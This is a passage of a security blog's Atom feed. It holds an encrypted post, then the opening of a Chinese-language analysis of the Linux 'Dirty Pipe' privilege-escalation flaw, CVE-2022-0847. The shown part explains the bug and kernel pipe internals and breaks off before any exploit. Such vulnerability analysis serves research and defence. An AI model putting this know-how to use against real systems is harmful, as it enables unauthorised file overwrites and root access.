9b27098260d62e1170c4235ccf85b44d0953785033722979baad48f267243f924f5b3fe137700cfe7edb97f87875ad00d1ac40e0d22dd776176e6179ef55f807c6910a05ecaab85e62fd39447732d8ef6716168f521149c7155a642b2d70ebd0425c7aa75259f735b4b3a066fbaa360b72b3dfdeef0f90ffacd6a7a73bffd8e09ad591c4351d0fe690090175c20d1678a270c0e836ec795d8e8be48def1ece83606d1d4091f24582f55b171335bcba7472d0f965ce0a2a9ff355cec243b918d08199519de26ada6747ab0f3e7114937b6d85219da1db83d4baf3b20843214360a4aa4e4ae6fbbd870af67383f4b3cf43438005f9cf2aad2d58a02513df3a1e26f073165ced0ea9d21b446659833b4a13713f903c40e78aaf712c8b0d5a7393cc48c61d1cfc995cbdab3b2221d6fbdf66d9e240b0714ec8ed47334bacaeafe75c9371c613b36355ab54e7677f6f60c57111ae371942a407640ed9059e15490cae1471e6ae61feaaf5725c17cbf9cb6b6797a2fe58de81af37936d395383927aa3421c2b11480f7518fe52e9d917e820d3075bd0c890577e0a94813a61fc58aad4954dc4e455be7d8d174d9ddfe1670f8eaffef937ff44083bf4ce896caf1299aabc3358f49a994970b6ae2709feed2bfee682e62592334c06b8bdee852d0fa0e3855d4c0a0b3bbf03ff7b0b79ca63be326051ca0e85297b279447ae51e9781696c5c8b3968c0a5a392dd11f97f5a40cea9016dab58534d848e02e7cc5dd4ca13708345d8fb2b192d149e4b1978cda66f1d13c71136b2aefff0ca7f6f1a9bb3bd8a974c39b8f46b1399688c4964fc293afea1f6dd8aa9fffca897b540b956e2e7b4c7780bd280f1cb075e0997667a7bf6ee0b789c1beaa21df05b2762292a266f5787655d4d6e81cf39ec9175d9805ef2f18f638318ba2f38513d9773edbdbe46da05905a6cd1618e9cfd86d0261434b86549fb32e85a5b0bc3ac7b5bebfa3814f26e50dd1c324f4d586982ef399f698b191980c2847c865b2a99373d845e13ec26ba637469d5c8bb2dc46ec70d798bc6239d61378c26e70e6a559559b61e738d05aafdaf608ee3c4322a1627bad8cffd694ea426a752e20e18ad068e7d0fbfe5cb33b345059c8cf2544ff00f6c679feb77ed0bef4fa1109760e47cd2d0fbe21f3c5240e91a0b1ebb5f60c83549187c5d6ed491aef4dae010d5c5ab5db5480a68896ecce1582e5f401fd1bd425f8056bb2d603fae40064a9c2df1117683da722b2ac0fab4caf97f0ac6eda5c87ebfb69b29c5b7a53ffa255b4206dcefa6f035e25cfcff6d3109d7c936b1c99ddfbfff84d6efcb9022775af383791325a72bdf3c19a4766dcc47ba559cb0ea5aa89f21fe70b3ab1074b5c66e7f7fe7077800c1e8a41d6913f615e3fc0f56b1fd44b7a4ee3f92bc1b41e598507e2c7e2b74763809c3edc892f492346bdc8844dc96191f5a57ecf5c9bf6a0a61cb623a6f827414951d349334d9c3073c95274923563ec80117331e711ebdb97716404b88fb478041aedee0354aed9bcc1572a4d8b9236d0dd7b2ccea3a3e596f8daa496ed850a15d6e9641139fd0a75bfe66fe0a4f39a956a5f324ea820613b3969bc78f60ca15fb066f0589e6f12dfdaebab61aef2f22e8b086f148c504fd3676b6b6b5e8ba81088c044cf93fc21cc16fd19518b64e0787098f93e7cb7ffe1b580563a1b34e280787406b12569149a2f198808ee0d6483ac14031376783e409a192228a6620820742d4c1bd14823fd589eb4fa22b686c0d61efb3685d5488c5a6cefbdde112ad8d0325f1dd00dc3ff5b78fba9f251e7ecd1850813e0a68e14616220042d7fde8aa714034406fe542856f49d53c274cefd7f4637239a339ad9272a31ed93d094b227bc1eeccfee46b270aa61a7968c5b20f80832b2b8f49e6556dc5085ddc14cfc51175dd42314c0d659b81efcab91f1ae0112706f95737eb5d99815e53c920a5e9c8416a1e45d5b24727df42844996f87ebfd4bd2ba719b46fb36e0704454ebf8938f5079e1375b96dc61fca34e7827f53b5a22e5cef2a6203542cfcddfad2dd72e6575512206f53ed434e1171e3ef675bca25e579804ee94468cc0dfa893cbfd767ae872998c3273d296078617f9c27023796f9b9f62bf71ca2b79b004bcf920559ff957b5200a8fb0d2160b1102a5ba3773189959cced97cd94a1e6e6076bf6079c6f9613ba6509095758e82e7d3eba976a41fa4f5d02730d93631f54a88b1a01316dbc69fcc14ca9332418afcea33ad91934a0188cc8eb89749721ef2ab7c2919a80016418c4b753324fe762a6ba7fb18487a5246dc1900737de4cdcd2660eed2c69f313f43e338667eb3a90a087c3698312466aa339596210e75a149a6f92d26501b2071f7e13c88eb1cd0eaac84bd8a44bec27580cde0512cd9ea0119e046d7a25766dff02eb235fd026813b3488430b19baaa747f85e641fedeef54f49415ea9d82c556d26f7ea345fb610d2efe45b5659119a0c9f9e96e2341ccba9c235b1e6de1b074c0b64c9fc6fb5e0d7e72f5dcd187c15002b03e87694e05bd4a5d739c6c5655491a86bb8c7c3ed5b632220589db51d7a4f1ac8c68600a6f99b60dbbb8aa1a2d97bdef479717895f62f3ac28499c5aea3e41c10ce3fe66b5e23020c69d406a7d4ac5ccc66878484f2446dabb3a54e98530dfa1940ec242be18d276e3b04ef540d2343379adeaab00aa81e6a72e7470911026d4b30382e946f729d2c2ae5b45870395d100b8bdd86ff681796569604f6dff38922f5c014b2f4d2c442218dd5ced5200fb8709339c8c49795cd8ba08fc5eebab5685a5636d524c5428b7bd8e2f5bf3e9a246d89095400d46745af6dbc9243ce599bd32200d713da69293d044b46941afd463c8a78396653fab112b4ff82d450148ee74b06e27c4aadf533a54c935618dcc3aae5ef41c84a5a82b648315f118bcfe0840b1df70d82c6b033d8f3d8f0ec8ef41fb60974393c7b3ed57feb9607a3439f99b3f0c0739ab4b28ce77a1b415f601cfe41c85fc3ac8fe997e8dd0acf54596dc62929bc61beb310a5d0c930010a8e2c88c5385b17a0f0ed68c4403d4262c860c590caf539d606d72e19f5f74904c15c4a551fbe205767c8fee753e0cc05bfe64dc6c0aaf6ba2d20f99307ad81009b0b35f63f729045b434266e4154fdd5a3f243e657580306036589b85ef95ac77c5e6f834d0fef9060cc5a2a3a90bba46961e9e16266854dbae23bec56f80e36d544558622c536cf02bf4f36230af85d356fdacb0b349e4542c892b18086744a896db7a3656bdd43ab16c086c60d8a8eb9a60408afa923aea3aec98d4814ff7a28e64a9f6f892e778442842afbdd7b2e2fc771fc5bfec2a7150e90d4047831cac65f5950b25edac2229122cf98d521956c255270322c3a33bc3eac12c4904281d29afddba4d8996cea6bdd586735d5cc0be4b358a1e5e369f8e518d1e19305293d50a18c2b8ece01c89d40a83333843abe3c86ba09df1a446c77d5c5a5e47a0ae2ced39eee35537e71a8c668dc11c8b3c5010bf711b040cee59bf0851848155711fe8a1f3b004654fad25d9b00d7a7dd419a2403e26c1522b7c7c3d3d1ff882f3752dcff157c5bc043fa5c4a868f5a2ac2106b8a568cac7ac13217cff87f08217681fe99417923199ba1b4c547a5396bdd152f7591151d96752aac9fae00631140f260266e55ef86ee647c77fc6e55cc1459e301116cdf0616bc301b6a55dcda5b32fa64db3d628bf4373f51699c9114d3d4ef9cc540d98340c83c18d78974f6d4465aa74e541178b4a8ee067e9e49d3d7ee5e274371952feeba5a23bdaaf90218da50ea22d4ddd7f15e7f4fa33fc37c3fd4679f1bffd22e8b93ed5dc2e1b37e4d7c4cca5502092d908dbba2febcb89c71b44625497d62e793c64b8b1a2a8141540a384a36b5ec0a023e6c5f0f63003c268ab7ed05fd22aa91bcbd0d2301d1d0be47e3afc1c30e379ac48e621e541b9b86f72337a0e7a9adf5ba701f4dcdfd454b7246e9888e7f2b71dd0f48df2954cf182935606e1406ed4d7cc0db0b40127216a0b816c348311340efedb209784e8c592971858ddc4289207157aa95b8b6d2c2a7bf977b6c08c2ac9e30571e1c30ca79ed132d9db65ed246de08829cf2ff8e35a2c5d24a0f421f4784cfff63399b6f284ea6e23591859da56d5905d265223f5c3ac05044d7a035a4685441321f7aa2b2f9297e9c4b24b03c48a5fcca8c001ea95d5b55a610287ba284f28ffc43b898a6f9f06e3185ab67ccd32091bfe7dad47bfd70fba676ee069c9600c4ce3c9fb1492c6e842caa8a042681333381f3d171d79c51f57e4d68aa9e7ee83decf5204f833bd6a56327104c0f09f64f44048eea3d144c927dde9b3b1796df1b624bdfe2033fc14366563ffa23b2b173c2529818e6238ae12e351aeb9fd8f370a7e864037785683cc33a20be757130bb447adb80bbc4ba38854b7d188a984faa7e060c136de7071b6371875e0bb5ae3dd1efe2554d91888d945edfa45f6fd21736781f6fa1eff033635809fce8090accdb57d6efadd4cc274e1fb4daeef2dc0ada75b2fcc7194e16062c5f012d97e8f6251d776faac870606d48e14c2418fa89bbf5aa5933b8d16970955b8f5b0115e5519044ba56643ae822035d2a9fb26eae96d05d5ec638877a41bc49e60e18cf1a599bfef594f9fb315535abfbc1c39e20910524c2766d4301e2631eb6e398007ac851421f8023e65b73d0ad59c3c4ec429e8af7a1d31270fa3d07a1f846d34db11521838b27306c0f4cf2a1a4839062c9bc2962c0205fae1f226849def5694a49561f7681f99b92b2fe4868f1a6996a395a393b0ff896d6e4219cee828d2604cce53f8d86df52b99ba0d7682da1e3da8e851e2314e8de7ee71084585d9240cc6d16dee8a5b22f5df3c0931aa29da1644e61dda17819498f7fffd2ed0aa9ef451f0b8b5bc71825a78bc3352266d909a1e143863837831faef30f1c934b85ece9f5b9b409748df75933ef7cf4ce541925f62e25dac1170ca263477c0ebe963364532e0dfa0933ce96e438499c15f275d176db75d8b842372750c7a6b78728fc654834846f0597ae151ea4a904487941dec34b241e1656dd0f36b214131f4987de69dadff997e4851e91a61031618a204d28bac8b017c30e3bd326becbca75434789a4022cfb098ae5a73877e3de79d8fb9e3fc2650d86b479ee24b0fac66e6b5ae1d33ca8f12fc7ea5617f0a01b33c1cdd9b3cca3ecadc1d240dc1a965413ed8214853730166240f9a22ef8e77c0f231f56faca61b277a06a4c9eceb5d54a3a89322baa6c98ccab35040be511440b09ce3856dea2ef23b0d87852794cea13e71067c41e86f816599a65f20e6bb4e5b62867903f470ce8049ed7ee40eba2c9c4360978b15d6f383d82cac2888c49c0e6e16f897bdbc50259f06326a699b049838d000f129dd28147cf4d1fad1eab2f23ad4cc451a7a2e78685d1d2d3be46ac019867e42af0793007b6c415efffc39fe4c8956fe32fb25667e4096801e706f377367346aca5c9a0d6c0b674be332ef17fada3cf14988e1ca29bc87c14aeb9cee6289a54899a90b4d4652f4634864d956d2bc6e0fc72aea6e13ccaea311b2849c481eec2242f48a045528d13347293078bf1405a0242c72fdf6fae2e98128227e8d5de09b96f2f0a530af4a2f5caf5824ecc1b3ec0cfdb0ae68be888b38c0f00844b143a69708e13e7eb087f4827d93237ade2175bc2a5f96c0c583a80be49466058b3257648ce5a475d31044fa33a192750309fbc14a73880157ed2fb16e382a3c6c496ca6acf1353fb618095637c70e1c486da116391792fb39fa83a10f3260e8db52dcb7054f570b12344e0fbcffa55a0a6233278a05ef2952715e4d0613b3085d27f2fed8f631d9039679bec3bee13853e0ed40fd1f15ff9cab1617e46160810c2ed8c2a91f3ce5ed4dc1eef75f24df504581bacf1e9ad6fb9ad7ab8d50f3a8170071b75df08f01e35d4d99ae59fe6e014cb08851309f8cdcbcec66c1dba12d9b89895c803b11336c53abd285e97f4db902a0b0ee1631e55b2a1ec6b097b4dd09b17a509386ed7d6b0f1a95da6247974a8e8b971be307e49bb9743ed61e7ad66e931b7f2b6be4fbdc850d3ebd0c973cabb547b12cedde0dd058b9cad9b635d58800457661a27d477deee271b7fb949ec2eb5a16af843e9ebe0e91fab2b1874341100faf5098f339acffd3a2a49438c6bdca32985342f7b1879416f478b2ea2d3a1674df2006011eeba683916818bd2500b780aedcdb904f569317592f65cdf59b35e9ebd8694f2581655457df9f4124571d3e1714e4809a5744506a3f2b087eea9567f7b36443fd1bf4ead17fa0d6d1d21a64ba6f1510aa3df85c7b7c0cfa7969ab9c951a77a2c765cd232e865f23525c1ca97ca356e58e2613ce150b6310612e3fe03dbe4286792b86b81e618d44d918abd9271d30bfbbcaa50351f418391841b0c7cca21a0f2ee12a03f429efc8ee46f2789934ee98f6916ce4ca35a7ec0a174115ffa65c55b7c0c19b66254469bc25a76867bf3047f3667a98e6b10151a2f9463b7c3f35ebe9baacb89f9a115d691a15a77dfd9beae19af41d65a71d3ef9e555fefdb17249740d54c1d3fc6236a83711a5c171248a0956cb89830ec438f045d00bf0ef689311a9fbb6cbbe483da13f66061ac93f4b078627280d4eb0ea46de2a42331b54469c2c53c7d5f87e80becc0f941eceb69bb45ca223c7cf0bec504e776581ba6200bfe14b42bdce1ba9d6b31567aec0d6ace4d42ac90faaa855fb5e9ce8bbd6a5004b9a199bb2d0bcdb73d2c1898944f7716fcbef520ae2819ce5341290a377e65a467515d3ab993ce6b137472ee8cc24ce4b33d4db46c04fa40eb88b60796b91ab2f89c3b7abc271ffdeec1c2dcdd08980e0d24c3258524c91b8ef3cc118817ec16fcf496b385f1048e844b56968fdfd68dcf4c17fee0bb5a40688ab3a6a3650f16a4a9b28e8327ac3cbd5c9f48086745079eb5cbda2efa85e10da91af35ae97c3dd8bb15c72fa4ac5fbd823f2e98446301d630783111b916ae539c95b1051a8ca010609b2a40c61f0fec3d4b537f77fa6138b1fe5630ab87a8e1c0a6818caa1ed1a3fc15f719d312296d62607a699a9311eacd215357b018c29b0e82387d5aae91f3b525d2100dc05ba73c225b285a3c5f7937174bfb569680c7ae4562006543697cb2d9c661e394a69edd483d22b0681d7d18cc63518e4f4b5312624ae21bab2d8013909c44ac35324d6fd0d568bd7dd1a5c04ece10f7069e1b5b28f018453450afe73c370a9a79105d2571573f3ae452fef8da2aba3695fbf6719ed9fb641c48a11b1958ec7115454b8d8a87c86111f2dcae8fad6b45f7d1bea528cefeee98b1aebac34a1d9f2fff80c810e8f5b97381e53eb6e3c748eca405446d4560b78ef3b2514d21408fa33ff5f3bbc223349799d6da8a86295779c5aada9415478f9ba64b0b47da42f9e88ebe760d17a8e8dd4710edac628489279270125806396be6474c409b88086cc548d03c91c11e71b7e999bcc688c2edad81318ffc923f27526e5ce79afd8f46c151010bbd7c318751d4f10b3642f4b889ab68257741f57ab87210a6b710e0ee83714905aaf80b2a11aa0f4701cb2dc64888270bd87fe1dc0e6b11392c96ebcfde9f079f664fa9fe7f0ea095b6d85502f149a04c3cfbd7bfbdfd4ba6f7d56639dec40acf84e3a7f3c27fe355c6dccf3ddd1040ab8bc78426c827ae605e3a6eaf9f094bc7ec9e56739d07189bce0a616f7847fb37b219beb1ba414ea97ddfdf2c407ab508600d9287773bea29d313bca89870104576a1571f5307653600d391107dcff437d3a9ec2d9f9d822e32328731b38afc764c92ab6cdf5a3ec8bf1811060e478b1767b5c75384744e58102ae4f0245d208a2d117ed6c5e865356786270ac78a20db8472744932c4615dcfb9220234632b3c4158fb7334be3e8b12b729e699dcb63d02e9ac99c11f6a123a247da5992a7e49f336927e53a900045e997df991ac268cb11e58282fb46223f0fe7678c6bdff196b442baa42cbcf2b8db74be90f200b71d829f7239f506e549911f62da77b1293981a471f0f1f8a3f00c8093d3bf5bbe834090280f9eaab0661f193886e3555e1e038d4f0a39bd1984e3dea2a8a82efe0f6f4741fae134300f22cd32b256df826a95234f28804f8d174a5c76920abce4e842e1ce263ba7ea0f7463c554fec87edd8c3df43251dbaa65b8df33b7cbde6767bb9c05ffa5b0d07872107758de690123cfb1328bef599f23e70ebdd687ae4ce68d5c596bd40397b816ff99b45de8dcfd3c74758bb5f27b5019db8fffc1255d5ea2c0b79259b85ed0c0c7ef25f2c443588aa1a2ab0a9f22bdfaccb5608fa9dd8da8c1458160ab42478dff3871e1b27f5723e6344bb3751636ecca45464d6d8d925433d7282bddf3249c2c0220683c5a1117c6b93c0b9962d8ac98e0395b8923b6bb59eb8eba72019bc19122f1168c96a89ed1dde38bcb9433bc1f7a36a9e7b39ed0bc5e4444cb4ef7b5d5957f18206ec56248728390a03856b6fe5dfb73406d07b87b7fd1f82961d4fb140925ff220b2098e37d009af386ccba487ddeed8f127d4b347063126a6d97b3880c22cd404fa5d78522927734c30e4d2c263de152c0601997e8923536e99e8c638a204a560068865836360edf61d1cec66b798ed948c1a8309ab2f20f9e0282930fe1c9c807935f75aef37ac9bd50283aea5a292c85d349a650605774db42be716dda6dca4903ea0e676a92724f073e2ff7b10e2fc30f71ecdefa4bcec5ff738181ab1de4563580aec2c109259ec1225e649f2b3b68c218470c1aa3fe1907b3159374fec31ac5bf5135bf961ae36aee0d3579f9835c4cd7287cf4389aefa002b2b950cbf260855ad3dbf34abb4e6b2af9d26e989e2dae6fd8ad1bc8a76b35608d2372aa92f111c5b5e15d8258067c46a732baedaab78e47160cdc5e5923fafd60d9c99446342b1f78444d4ffa0ac532936ac7fc66141fe03e29bb8d0a3c05eacc5a4572e23689eb675de27615da69e72153e0f744b11dd78a32af6ace939bb296381721f7a2c629fcd12263c309fea75ed65c7d9171b596d9ffc1453d0118d24479768853ab5a53a693a7c477311767f311673fe11e72b49894b2a6666b2b7e6149fd50b633dacbe76bea53fa1979851e4f858215e971aac90ebe1aabc36fedd345e4e18db46d594de7a2d3be1033e25dd1130930dc27cc187c162c59fbb51872313132c3f6ce42c814f9035b12ecf1b2d8c4671fd97b119ea6f2bd38f26ce131e5902e0379b24d1854c14f33340cea6a487287e4d96d99c6c23a151e9849e6bdcdf51b074fc81ef85ef6d12c86bcbc96a15845cfd00dea255b087a9d7419e96ad5f893e1686ecd7b043d68098134a9069afe7f51a3b27a2f56b2652391b3c20840078db825c60552e46362608fd31a7c1f85b6a4fc66f66e6a415d13dcd07aa69ee3b80c1d9bc4ecdaec9f3727038832e6dc2747c7c14bf58cb9704aba164a477c47e6d015ac2f5fb2ce2a5ba777d1691e30c3d322854d71e720abd86467bba8861c4ce578be0fd21b4bc6de4a95c7de3c958b8e949b395113872bd2b404d4b1389a860a20ef882434ed2b56d70ee7ecc22bae9eb557d108701ca54faf030236df99c1128f36e150f1dbccd18cb750e4c90d1ef040bde27a8f97cbceab8d0c1ef5f8a2bcf3692a46f8271b1014d22839171154031bb1f0472b39ae0fbb14450a0896b4edabda716233b00248e1b6ffebc28972d87be9ce54560fa6d6fc88e14bbe2d2edfc93895ca9c90a34798b5febe34843f916ea414c7d1eb811be9952f0efd69df2da456724881b500e64509d18017841fa1c22bc6eb8a56cd96f04279c9258519818ec1134f97c4889d672d9b86e741f7aa4efae4af2524df100908dab5e3fd4a7548a6eb8dba3d3991b9ac869d28b4e4fdc9390385d8fa25803bd5ed800c0a2dd36b15139c00f22f5ec605078e6e28508b4cd5895d322ea31c945359e55d0e0977041af5369c909c1200038e7b3a8603a443ec047c05cd52f2164f6b42646bef7b0699112b6dcb9042ca954e0861821c87e068d4a67baad9246c68d3829cfe35396af9efc2427d0797f0d07dc65d2df720d34e7acb47be9472582f422cb8da6c41bdff228a9cc9165d86fb136ed29e2d7ee79610c0fecf63f7e9591d25eb2aae8d9b222450361f62098d41909a6540d1fee40a6657a1d7e0b42342903f330ff0457a83ba7eb16025316b595bae4ea294a3f840cd59f68331e66a5c3441f3d4f378f6a0f8c6d00b9977af8e0a09f7ed322ffac708fa5bbfb39e84c03c670ad2f852711fddb8559995496f7ae9a6ef218e8dca4d8901b02719578116741eb02794faafa50e905881f8f0079eef23cce85bdd04a44149efbcd2d0f5d953532f00262e15888e6d61ae1e7585a52fe15bf408e836403e31c18f3317c844954099dabc1c175dae58dd234a4a6e153b97b9d33a8a79076634e714ab6554647173dbf123a1db45a54a130d793bbe8a1d00c31cf0d66099ac041f861a25b1ab1febccba83051654530d179ade407b8b35bfb25ce6986f04efdb9671ffc6cee4106d4d59bf8c8932d61d25fa6ffc8f1265004cab14b478edcd617e3593d8f2bb23e46032ff90d7d5cd128e29d6e58cc775c78b07bec4b0a5bb7196813c6fe3c4ab52f705a4cc6627334ca938eb789fd40c60da8be5babb630c975bdf7e7cc190cb5305edf2130ec5f8655ed29e628be2c441a67a5e5d3e3cae7e0290557e85b288ec9e174055264a8787eb7c486398f9993bdbbd6041d7f29c82b42ea7c1f3e7060d7ffa70d188d3f5ed98cb9dc89fda0e9de6ae894c2f168f1034f9a3986b52b44c905debade59dc1b8d5a48755f2ddf500c4108019dbca361665fe13e120bc5ba127c99e49ef81a530f7bb4dbd947a44cb241a535d8c50ce7a050bd35aa657b3bf9cc05d94532425a093771f809cacfa0313cb4953f4a47e7f722ad37eee10bc217cb242d6509f1ed53905e982bcc9dbefd06a72bb06ae0edd4d261ac668f1f143667978fe326f9224567772bb617807d8215e98904dade2fa8858c27857334298373300d473c8eb55434a96263e0a31f296ac7ffc8212bb00e93bb2837b4db051947a58991f4109d567452374dddc32521688a34b555bd667febed2757f6e1a18af8c21a6fd6e016b45290df317a9e9c312c6e40f34ecd0b61cf243963a1c379332283ad1737c784e1f2e3ed7fd1e46d73a8b7e3017ab49c22eec325b575e440099ad8d199d5fe227566b8a6e3190fd17183bc107cd31c77dabf4e4fb1025a64eeca9a19c5fe91bda666b0801b4245a4e80daacc9df685715f77b3fd606b54ac10f0f8b706e728e576a173fb91702e9bd02859be9ec6c9fa94563a32caf21f279a7beb0c10688991f17bcfdb089912fbf05037d8ae122e8c3b2901958c49dbc9d5bc12ce37488a1467a96dd3e6b3ef012a50eacce387fb31deb30edd8dbcbcd4fb15402eea49d15e127a476a585084ff3166df80a77db8c449ede363b26738dcd8fab95b4a05b9d1c5d873af0d4582bb684cc92ab88dbad7577342564e1be3bc9cc456814991bcb24a682db89a62a060378744a980620357d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">NEEDY GIRL OVERDOSE</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>【CVE.0x06】CVE-2022-0847 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/"/>
    <id>http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/</id>
    <published>2022-03-12T11:39:02.000Z</published>
    <updated>2022-03-21T07:45:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>我超，管人痴！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2022-0847 是这两天刚爆出来的一个热乎的内核漏洞，漏洞主要发生在对管道进行数据写入时，由于未对原有的 <code>pipe_buffer-&gt;flags</code> 进行清空，从而导致了<strong>可以越权对文件进行写入</strong>；由于这样的漏洞形式类似于“脏牛”（CVE-2016-5195），但更加容易进行利用，因此研究人员将该漏洞称之为「Dirty Pipe」</p><p>据研究者描述，目前 <strong>5.8 版本以上的内核均会收到该漏洞的影响</strong>，在 <strong>5.16.11</strong>、<strong>5.15.25</strong>、<strong>5.10.102</strong> 版本中才被修复，影响范围不可谓不大，因此这个漏洞也得到了高达 7.8 的 CVSS 评分（CVSS 评分好像改版了，2.0 的标准只有 7.2分）</p><p>这个漏洞的发现源自于一次 CRC 校验失败，感兴趣的可以看<a href="https://dirtypipe.cm4all.com/">原作者的博客</a>，是一段十分奇妙的旅程（笑）</p><p>本次选用进行分析的内核源码为 Linux 5.13.19（因为笔者前些天刚好编译了一个这个版本的内核，刚好受到该漏洞影响，就直接拿来用了）</p><p>在开始分析之前，我们先来补充一些前置知识</p><h2 id="pipe：管道"><a href="#pipe：管道" class="headerlink" title="pipe：管道"></a>pipe：管道</h2><p>稍微接触过 Linux 的同学应该都知道「管道」这一 IPC 神器。而在 Linux 内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> （即创建了一个虚拟文件节点）来表示的，其中在节点上存放管道信息的是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息</p><p>当我们创建一个管道时，内核会创建一个 VFS inode 、一个 <code>pipe_inode_info</code> 结构体、两个文件描述符（代表着管道的两端）、一个 <code>pipe_buffer</code> 结构体数组，下图是一张叙述管道原理的经典图例</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="非常经典的一张图"></p><p>用来表示管道中数据的是一个 <code>pipe_buffer</code> 结构体数组，单个 <code>pipe_buffer</code> 结构体用来表示<strong>管道中单张内存页的数据</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: 管道缓冲区中存放了数据的页框</span><br><span class="hljs-comment"> *@offset: 在 @page 中数据的偏移</span><br><span class="hljs-comment"> *@len: 在 @page 中数据的长度</span><br><span class="hljs-comment"> *@ops: 该 buffer 的函数表， 参见 @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: 管道缓冲区的标志位，参见上面</span><br><span class="hljs-comment"> *@private: 函数表的私有数据</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>创建管道使用的 pipe 与 pipe2 这两个系统调用最终都会调用到 <code>do_pipe2()</code> 这个函数，不同的是后者我们可以指定一个 flag，而前者默认 flag 为 0</p><p>存在如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">do_pipe2</span>()</span><br><span class="hljs-function"><span class="hljs-title">__do_pipe_flags</span>()</span><br><span class="hljs-function"><span class="hljs-title">create_pipe_files</span>()</span><br><span class="hljs-function"><span class="hljs-title">get_pipe_inode</span>()</span><br><span class="hljs-function"><span class="hljs-title">alloc_pipe_info</span>()</span><br></code></pre></td></tr></table></figure><p>最终调用 <code>kcalloc()</code> 分配一个 <code>pipe_buffer</code> 数组，默认数量为 <code>PIPE_DEF_BUFFERS</code> （16）个，即一个管道初始默认可以存放 16 张页面的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<br><br>pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br><br>    <span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>管道形成的核心结构如下图所示</p><p><img src="https://s2.loli.net/2022/03/12/cyUY4fmwHr5I6ts.png" alt="image.png"></p><blockquote><p>page 结构体用以<strong>唯一标识一个物理页框</strong>，参见 <a href="https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/">https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/</a></p></blockquote><p>管道的本体是一个 <code>pipe_inode_info</code> 结构体，其管理 <code>pipe_buffer</code> 数组的方式<strong>本质上是一个循环队列</strong>，其 head 成员标识队列头的 idx，tail 成员标识队列尾的 idx，<strong>头进尾出</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 